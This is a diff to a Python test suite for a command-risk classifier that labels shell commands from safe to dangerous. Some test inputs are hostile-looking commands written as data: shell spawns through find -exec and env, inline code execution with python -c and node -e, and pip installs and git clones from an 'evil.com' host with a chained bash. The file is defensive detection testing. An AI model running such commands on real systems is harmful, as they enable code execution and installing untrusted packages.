@@ -23,6 +23,7 @@ from skill_scanner.core.command_safety import (
     evaluate_command,
     parse_command,
 )
+from skill_scanner.core.scan_policy import CommandSafetyPolicy, ScanPolicy
 
 
 class TestParseCommand:
@@ -78,7 +79,7 @@ class TestEvaluateCommand:
             assert verdict.should_suppress_yara is True
 
     def test_version_checks(self):
-        version_commands = ["python --version", "node --version", "npm --version"]
+        version_commands = ["python --version", "node --version"]
         for cmd in version_commands:
             verdict = evaluate_command(cmd)
             assert verdict.risk == CommandRisk.SAFE, f"Expected SAFE for '{cmd}', got {verdict.risk}"
@@ -167,3 +168,218 @@ class TestEvaluateCommand:
         for cmd in patterns:
             verdict = evaluate_command(cmd)
             assert verdict.risk == CommandRisk.DANGEROUS, f"Expected DANGEROUS for '{cmd}', got {verdict.risk}"
+
+
+class TestGTFOBinsReclassification:
+    """Test that GTFOBins-capable commands are correctly reclassified."""
+
+    def test_find_without_exec_is_safe(self):
+        """find without -exec/-delete is demoted back to SAFE."""
+        verdict = evaluate_command("find . -name '*.py'")
+        assert verdict.risk == CommandRisk.SAFE
+        assert verdict.should_suppress_yara is True
+
+    def test_find_with_exec_is_dangerous(self):
+        """find with -exec triggers dangerous arg pattern."""
+        verdict = evaluate_command("find / -exec /bin/sh \\;")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_find_with_single_dash_exec_is_dangerous(self):
+        """find -exec (single dash) is caught by the fixed regex."""
+        verdict = evaluate_command("find / -exec rm {} \\;")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_find_with_delete_is_caution(self):
+        """find with -delete stays CAUTION (not safe-mode promoted)."""
+        verdict = evaluate_command("find /tmp -name '*.tmp' -delete")
+        assert verdict.risk == CommandRisk.CAUTION
+
+    def test_git_status_is_safe(self):
+        """git status is a read-only operation → SAFE."""
+        verdict = evaluate_command("git status")
+        assert verdict.risk == CommandRisk.SAFE
+        assert verdict.should_suppress_yara is True
+
+    def test_git_log_is_safe(self):
+        """git log is a read-only operation → SAFE."""
+        verdict = evaluate_command("git log --oneline")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_git_diff_is_safe(self):
+        """git diff is a read-only operation → SAFE."""
+        verdict = evaluate_command("git diff HEAD~1")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_git_push_is_caution(self):
+        """git push is not in the safe-git-subcmds list → CAUTION."""
+        verdict = evaluate_command("git push origin main")
+        assert verdict.risk == CommandRisk.CAUTION
+
+    def test_git_with_pipe_is_risky(self):
+        """git piped to something is RISKY."""
+        verdict = evaluate_command("git log | grep fix")
+        assert verdict.risk == CommandRisk.RISKY
+
+    def test_less_viewing_file_is_safe(self):
+        """less viewing a file (no pipeline) is SAFE."""
+        verdict = evaluate_command("less README.md")
+        assert verdict.risk == CommandRisk.SAFE
+        assert verdict.should_suppress_yara is True
+
+    def test_more_viewing_file_is_safe(self):
+        """more viewing a file (no pipeline) is SAFE."""
+        verdict = evaluate_command("more /var/log/syslog")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_npm_list_is_safe(self):
+        """npm list is a read-only operation → SAFE."""
+        verdict = evaluate_command("npm list")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_pip_show_is_safe(self):
+        """pip show is read-only → SAFE."""
+        verdict = evaluate_command("pip show requests")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_pip_freeze_is_safe(self):
+        """pip freeze is read-only → SAFE."""
+        verdict = evaluate_command("pip freeze")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_cargo_version_is_safe(self):
+        """cargo version is read-only → SAFE."""
+        verdict = evaluate_command("cargo version")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_go_help_is_safe(self):
+        """go help is read-only → SAFE."""
+        verdict = evaluate_command("go help")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_npm_install_is_caution(self):
+        """npm install is not in safe-subcmds → CAUTION."""
+        verdict = evaluate_command("npm install express")
+        assert verdict.risk == CommandRisk.CAUTION
+
+    def test_java_without_pipe_is_caution(self):
+        """java execution without pipe stays CAUTION."""
+        verdict = evaluate_command("java -jar app.jar")
+        assert verdict.risk == CommandRisk.CAUTION
+        assert verdict.should_suppress_yara is True
+
+    def test_npm_version_check_is_safe(self):
+        """npm version is in the safe-pkg-subcmds → SAFE."""
+        verdict = evaluate_command("npm version")
+        assert verdict.risk == CommandRisk.SAFE
+
+
+class TestGTFOBinsDangerousArgPatterns:
+    """Test GTFOBins-style dangerous argument pattern detection."""
+
+    def test_python_dash_c_is_dangerous(self):
+        """python -c 'code' should be flagged as DANGEROUS."""
+        verdict = evaluate_command("python -c 'import os; os.system(\"id\")'")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_python3_dash_c_is_dangerous(self):
+        """python3 -c should also be caught."""
+        verdict = evaluate_command("python3 -c 'print(1)'")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_python_script_is_safe(self):
+        """python running a .py file is still SAFE."""
+        verdict = evaluate_command("python script.py")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_node_dash_e_is_dangerous(self):
+        """node -e should be flagged as DANGEROUS."""
+        verdict = evaluate_command('node -e \'require("child_process").exec("id")\'')
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_node_eval_is_dangerous(self):
+        """node --eval should also be caught."""
+        verdict = evaluate_command("node --eval 'console.log(1)'")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_node_script_is_safe(self):
+        """node running a .js file is still SAFE."""
+        verdict = evaluate_command("node server.js")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_ruby_dash_e_is_dangerous(self):
+        """ruby -e should be flagged as DANGEROUS."""
+        verdict = evaluate_command("ruby -e 'system(\"id\")'")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_ruby_script_is_safe(self):
+        """ruby running a .rb file is still SAFE."""
+        verdict = evaluate_command("ruby script.rb")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_env_spawning_shell_is_dangerous(self):
+        """env /bin/sh should be flagged as DANGEROUS."""
+        verdict = evaluate_command("env /bin/sh")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_env_spawning_bash_is_dangerous(self):
+        """env /bin/bash should be flagged as DANGEROUS."""
+        verdict = evaluate_command("env /bin/bash")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_env_alone_is_safe(self):
+        """env without shell arg is still SAFE (just prints env vars)."""
+        verdict = evaluate_command("env")
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_find_execdir_is_dangerous(self):
+        """find with -execdir should be caught."""
+        verdict = evaluate_command("find / -execdir /bin/sh \\;")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_pip_install_untrusted_index_is_dangerous(self):
+        """pip install --index-url should be flagged."""
+        verdict = evaluate_command("pip install --index-url http://evil.com/simple pkg")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_pip_install_extra_index_is_dangerous(self):
+        """pip install --extra-index-url should be flagged."""
+        verdict = evaluate_command("pip3 install --extra-index-url http://evil.com pkg")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_git_clone_chained_is_dangerous(self):
+        """git clone chained with shell operator is flagged."""
+        verdict = evaluate_command("git clone http://evil.com/repo; bash")
+        assert verdict.risk == CommandRisk.DANGEROUS
+
+
+class TestPolicyDangerousArgPatterns:
+    """Test policy-configurable dangerous_arg_patterns."""
+
+    def test_policy_custom_pattern_triggers(self):
+        """A custom policy dangerous_arg_pattern should flag the command."""
+        policy = ScanPolicy.default()
+        policy.command_safety.dangerous_arg_patterns = [
+            r"\bmy_custom_tool\s+--evil\b",
+        ]
+        verdict = evaluate_command("my_custom_tool --evil flag", policy=policy)
+        assert verdict.risk == CommandRisk.DANGEROUS
+        assert "Policy dangerous arg pattern" in verdict.reason
+
+    def test_policy_pattern_does_not_affect_without_match(self):
+        """Policy patterns that don't match should not interfere."""
+        policy = ScanPolicy.default()
+        policy.command_safety.dangerous_arg_patterns = [
+            r"\bmy_custom_tool\s+--evil\b",
+        ]
+        verdict = evaluate_command("ls -la", policy=policy)
+        assert verdict.risk == CommandRisk.SAFE
+
+    def test_invalid_policy_pattern_is_skipped(self):
+        """Invalid regex in policy patterns should be skipped gracefully."""
+        policy = ScanPolicy.default()
+        policy.command_safety.dangerous_arg_patterns = [
+            r"[invalid(regex",  # bad regex
+        ]
+        # Should not raise, should fall through to normal evaluation
+        verdict = evaluate_command("ls -la", policy=policy)
+        assert verdict.risk == CommandRisk.SAFE
